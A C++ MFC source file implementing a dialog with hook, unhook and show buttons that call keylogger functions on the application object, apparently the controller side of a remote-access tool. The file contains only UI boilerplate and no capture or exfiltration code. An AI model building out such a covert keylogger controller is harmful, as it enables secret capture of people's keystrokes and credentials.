// keylogDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Server.h"
#include "keylogDlg.h"
#include "afxdialogex.h"


// keylogDlg dialog

IMPLEMENT_DYNAMIC(keylogDlg, CDialogEx)

keylogDlg::keylogDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(keylogDlg::IDD, pParent)
{

}

keylogDlg::~keylogDlg()
{
}

void keylogDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(keylogDlg, CDialogEx)
	ON_BN_CLICKED(IDC_hook, &keylogDlg::OnBnClickedhook)
	ON_BN_CLICKED(IDC_unhook, &keylogDlg::OnBnClickedunhook)
	ON_BN_CLICKED(IDC_show, &keylogDlg::OnBnClickedshow)
END_MESSAGE_MAP()


// keylogDlg message handlers


void keylogDlg::OnBnClickedhook()
{
	// TODO: Add your control notification handler code here
	theApp.startHook(this);
}


void keylogDlg::OnBnClickedunhook()
{
	// TODO: Add your control notification handler code here
	theApp.unHook(this);
}


void keylogDlg::OnBnClickedshow()
{
	// TODO: Add your control notification handler code here
	theApp.getHook(this);
}

